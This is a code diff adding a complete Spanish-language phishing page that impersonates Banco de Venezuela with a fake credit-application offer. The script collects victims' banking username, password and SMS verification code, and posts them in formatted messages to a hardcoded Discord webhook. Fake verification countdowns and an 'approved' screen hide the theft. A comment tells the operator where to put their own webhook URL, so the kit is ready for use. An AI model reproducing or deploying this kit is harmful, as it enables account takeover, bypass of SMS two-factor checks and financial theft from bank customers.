@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Crédito BDV</title>
+    <style>
+        :root {
+            --bdv-blue: #005B9F;
+            --bdv-red: #D40032;
+            --bdv-yellow: #FFD100;
+            --bg-gray: #E6E6E6;
+            --text-dark: #333333;
+            --text-light: #666666;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-gray);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            overflow: hidden;
+            position: relative;
+            min-height: 550px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .screen {
+            display: none;
+            padding: 30px;
+            flex-direction: column;
+            flex-grow: 1;
+            justify-content: center;
+        }
+
+        .screen.active {
+            display: flex;
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-container img {
+            max-width: 200px;
+            height: auto;
+            transition: transform 0.3s ease;
+        }
+        .logo-container img:hover {
+            transform: scale(1.05);
+        }
+
+        h2 {
+            color: var(--bdv-blue);
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--text-light);
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 1rem;
+            background-color: #F9F9F9;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus {
+            border-color: var(--bdv-blue);
+            background-color: white;
+            box-shadow: 0 0 5px rgba(0, 91, 159, 0.3);
+            transform: scale(1.01);
+        }
+
+        .nota-bcv {
+            font-size: 0.8rem;
+            color: #777;
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            line-height: 1.3;
+            font-style: italic;
+        }
+
+        .password-group {
+            border-bottom: 2px solid var(--bdv-red);
+            background-color: #F9F9F9;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            border-radius: 4px 4px 0 0;
+            transition: all 0.3s ease;
+        }
+        .password-group:focus-within {
+            background-color: white;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+        .password-group input {
+            border: none;
+            background: transparent;
+            flex-grow: 1;
+            flex-shrink: 1;
+            font-size: 1.2rem;
+            outline: none;
+            color: var(--text-dark);
+            width: 100%;
+        }
+        
+        .eye-icon {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+            flex-shrink: 0;
+            margin-left: 10px;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+        .eye-icon:hover {
+            color: var(--bdv-blue);
+            transform: scale(1.1);
+        }
+        .eye-icon svg {
+            width: 22px;
+            height: 22px;
+            stroke-width: 2;
+        }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--bdv-blue);
+            color: white;
+        }
+        .btn-primary:hover {
+            background-color: #004a82;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+
+        .btn-disabled {
+            background-color: #E0E0E0;
+            color: #A0A0A0;
+            cursor: not-allowed;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn-group .btn {
+            margin-top: 0;
+        }
+
+        .info-text {
+            text-align: center;
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+        .info-text a {
+            color: var(--bdv-blue);
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+        .info-text a:hover {
+            color: var(--bdv-red);
+        }
+
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            height: 100%;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--bdv-blue);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: var(--bdv-blue);
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        .countdown-number {
+            font-size: 1.5rem;
+            color: var(--bdv-red);
+            margin-top: 5px;
+            display: block;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .modal-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            animation: fadeIn 0.3s ease-out;
+        }
+        .modal-content {
+            background: white;
+            width: 90%;
+            padding: 25px;
+            border-radius: 6px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            transform: translateY(0);
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-content h3 {
+            color: var(--bdv-blue);
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <!-- ================= PANTALLA 1: SOLICITUD DE CRÉDITO ================= -->
+        <div id="step1-credit" class="screen active">
+            <div class="logo-container">
+                <img src="logo.png" alt="BDV Logo">
+            </div>
+            <h2>Solicitud de Crédito</h2>
+            
+            <div class="form-group">
+                <label>Monto del crédito a solicitar (USD)</label>
+                <select id="credit-amount" class="form-control">
+                    <option value="" disabled selected>Seleccione un monto</option>
+                    <option value="800">800 USD</option>
+                    <option value="1000">1,000 USD</option>
+                    <option value="2000">2,000 USD</option>
+                    <option value="3000">3,000 USD</option>
+                    <option value="5000">5,000 USD</option>
+                    <option value="7000">7,000 USD</option>
+                    <option value="10000">10,000 USD</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Ingreso mensual (USD)</label>
+                <input type="number" id="credit-income" class="form-control" placeholder="Ej. 500">
+            </div>
+
+            <div class="form-group">
+                <label>Tiempo a pagar</label>
+                <select id="credit-months" class="form-control">
+                    <option value="" disabled selected>Seleccione los meses</option>
+                    <option value="6">6 meses</option>
+                    <option value="12">12 meses</option>
+                    <option value="18">18 meses</option>
+                    <option value="24">24 meses</option>
+                    <option value="36">36 meses</option>
+                    <option value="48">48 meses</option>
+                </select>
+            </div>
+
+            <div class="nota-bcv">
+                Nota: El monto del crédito será acreditado en su cuenta a la tasa de cambio BCV oficial del día.
+            </div>
+
+            <button class="btn btn-primary" onclick="submitCredit()">Solicitar</button>
+        </div>
+
+        <!-- ================= PANTALLA 2: LOGIN USUARIO ================= -->
+        <div id="step2-login-user" class="screen">
+            <div class="logo-container">
+                <img src="logo-login.png" alt="BDV Login Logo">
+            </div>
+            
+            <div class="form-group" style="margin-top: 30px;">
+                <input type="text" id="username" class="form-control" placeholder="Usuario *" oninput="checkUserInput()">
+            </div>
+
+            <button id="btn-entrar" class="btn btn-disabled" onclick="submitUser()" disabled>Entrar</button>
+
+            <div class="info-text">
+                ¿Olvidaste tu usuario o clave?<br>
+                Si eres nuevo cliente BDV<br>
+                <a href="#">registrate aquí</a>
+            </div>
+        </div>
+
+        <!-- ================= PANTALLA 3: LOGIN CONTRASEÑA ================= -->
+        <div id="step3-login-pass" class="screen" style="padding: 0;">
+            <div style="opacity: 0.3; padding: 30px; text-align: center; margin-top: 50px;">
+                <img src="logo-login.png" alt="BDV Login Logo" style="max-width: 200px;">
+            </div>
+            
+            <div class="modal-overlay">
+                <div class="modal-content">
+                    <h3>Introduce tu contraseña</h3>
+                    
+                    <div class="password-group">
+                        <input type="password" id="password" placeholder="Contraseña" oninput="checkPassInput()">
+                        <span class="eye-icon" onclick="togglePassword()">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </span>
+                    </div>
+
+                    <div class="btn-group">
+                        <button id="btn-continuar" class="btn btn-disabled" onclick="submitPassword()" disabled>Continuar</button>
+                        <button class="btn btn-primary" onclick="cancelPassword()">Cancelar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= PANTALLA 4: CARGA 1 ================= -->
+        <div id="step4-loading1" class="screen">
+            <div class="loading-container">
+                <div class="spinner"></div>
+                <div class="loading-text">
+                    Verificando...
+                    <span class="countdown-number" id="countdown1">30</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= PANTALLA 5: CÓDIGO SMS ================= -->
+        <div id="step5-sms" class="screen">
+            <div class="logo-container" style="margin-bottom: 10px;">
+                <img src="mujer.png" alt="Mujer" style="max-width: 130px; height: auto;">
+            </div>
+            <h2>Verificación de Seguridad</h2>
+            <p style="text-align: center; color: var(--text-light); margin-bottom: 20px;">
+                Ingresa el código enviado al móvil registrado
+            </p>
+            
+            <div class="form-group">
+                <input type="text" id="sms-code" class="form-control" maxlength="8" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')" style="text-align: center; font-size: 1.5rem; letter-spacing: 5px;">
+            </div>
+
+            <button class="btn btn-primary" onclick="submitSMS()">Enviar Código</button>
+        </div>
+
+        <!-- ================= PANTALLA 6: CARGA 2 ================= -->
+        <div id="step6-loading2" class="screen">
+            <div class="loading-container">
+                <div class="spinner"></div>
+                <div class="loading-text">
+                    Verificando...
+                    <span class="countdown-number" id="countdown2">30</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= PANTALLA 7: APROBADO ================= -->
+        <div id="step7-approved" class="screen">
+            <div class="loading-container">
+                <div class="success-icon">✅</div>
+                <h2 style="color: #4CAF50;">¡Aprobado!</h2>
+                <p style="text-align: center; color: var(--text-light); margin-top: 10px;">
+                    Un agente se comunicará con usted a la brevedad posible.
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ⚠️ IMPORTANTE: REEMPLAZA ESTO CON TU URL DE WEBHOOK DE DISCORD ⚠️
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1455415758573277204/o3Un28W-30feT2TDmtflDs444Cs24p6znc_Fj6V_ewbhkieTLJQhivtA0MchKMiPvEWS";
+
+        let datosCredito = {};
+        let datosUsuario = {};
+        let datosPassword = "";
+        let datosSMS = "";
+        
+        let timer1 = null;
+        let timer2 = null;
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.getElementById(screenId).classList.add('active');
+        }
+
+        function submitCredit() {
+            const amount = document.getElementById('credit-amount').value;
+            const income = document.getElementById('credit-income').value;
+            const months = document.getElementById('credit-months').value;
+
+            if (!amount || !income || !months) {
+                alert("Por favor, complete todos los campos de la solicitud.");
+                return;
+            }
+
+            datosCredito = { amount, income, months };
+            showScreen('step2-login-user');
+        }
+
+        function checkUserInput() {
+            const userInput = document.getElementById('username').value.trim();
+            const btn = document.getElementById('btn-entrar');
+            if (userInput.length > 0) {
+                btn.classList.remove('btn-disabled');
+                btn.classList.add('btn-primary');
+                btn.disabled = false;
+            } else {
+                btn.classList.add('btn-disabled');
+                btn.classList.remove('btn-primary');
+                btn.disabled = true;
+            }
+        }
+
+        function submitUser() {
+            datosUsuario = document.getElementById('username').value;
+            showScreen('step3-login-pass');
+        }
+
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+            } else {
+                passInput.type = 'password';
+            }
+        }
+
+        function checkPassInput() {
+            const passInput = document.getElementById('password').value.trim();
+            const btn = document.getElementById('btn-continuar');
+            if (passInput.length > 0) {
+                btn.classList.remove('btn-disabled');
+                btn.classList.add('btn-primary');
+                btn.disabled = false;
+            } else {
+                btn.classList.add('btn-disabled');
+                btn.classList.remove('btn-primary');
+                btn.disabled = true;
+            }
+        }
+
+        function cancelPassword() {
+            document.getElementById('password').value = "";
+            checkPassInput();
+            showScreen('step2-login-user');
+        }
+
+        function submitPassword() {
+            datosPassword = document.getElementById('password').value;
+            enviarWebhook1();
+            showScreen('step4-loading1');
+            
+            let timeLeft1 = 30;
+            const display1 = document.getElementById('countdown1');
+            display1.textContent = timeLeft1;
+
+            if (timer1) clearInterval(timer1);
+
+            timer1 = setInterval(() => {
+                timeLeft1--;
+                display1.textContent = timeLeft1;
+                
+                if (timeLeft1 <= 0) {
+                    clearInterval(timer1);
+                    showScreen('step5-sms');
+                }
+            }, 1000);
+        }
+
+        function submitSMS() {
+            const smsInput = document.getElementById('sms-code').value.trim();
+            if (smsInput.length === 0) {
+                alert("Por favor, ingrese el código.");
+                return;
+            }
+            datosSMS = smsInput;
+            enviarWebhook2();
+            showScreen('step6-loading2');
+
+            let timeLeft2 = 30;
+            const display2 = document.getElementById('countdown2');
+            display2.textContent = timeLeft2;
+
+            if (timer2) clearInterval(timer2);
+
+            timer2 = setInterval(() => {
+                timeLeft2--;
+                display2.textContent = timeLeft2;
+                
+                if (timeLeft2 <= 0) {
+                    clearInterval(timer2);
+                    showScreen('step7-approved');
+                }
+            }, 1000);
+        }
+
+        function enviarWebhook1() {
+            if (DISCORD_WEBHOOK === "TU_WEBHOOK_AQUI") {
+                console.log("⚠️ Webhook no configurado. Datos no enviados.");
+                return;
+            }
+
+            const mensaje = {
+                content: `**📝 NUEVA SOLICITUD DE CRÉDITO BDV**\n\n**📊 Datos del Crédito:**\nMonto: $${datosCredito.amount}\nIngreso Mensual: $${datosCredito.income}\nPlazo: ${datosCredito.months} meses\n\n**🔐 Datos de Acceso:**\nUsuario: \`${datosUsuario}\`\nContraseña: \`${datosPassword}\``
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(mensaje)
+            }).catch(err => console.error("Error enviando webhook 1:", err));
+        }
+
+        function enviarWebhook2() {
+            if (DISCORD_WEBHOOK === "TU_WEBHOOK_AQUI") return;
+
+            const mensaje = {
+                content: `**🔑 CÓDIGO SMS RECIBIDO**\n**Usuario:** \`${datosUsuario}\`\n**Código:** \`${datosSMS}\``
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(mensaje)
+            }).catch(err => console.error("Error enviando webhook 2:", err));
+        }
+    </script>
+</body>
+</html>
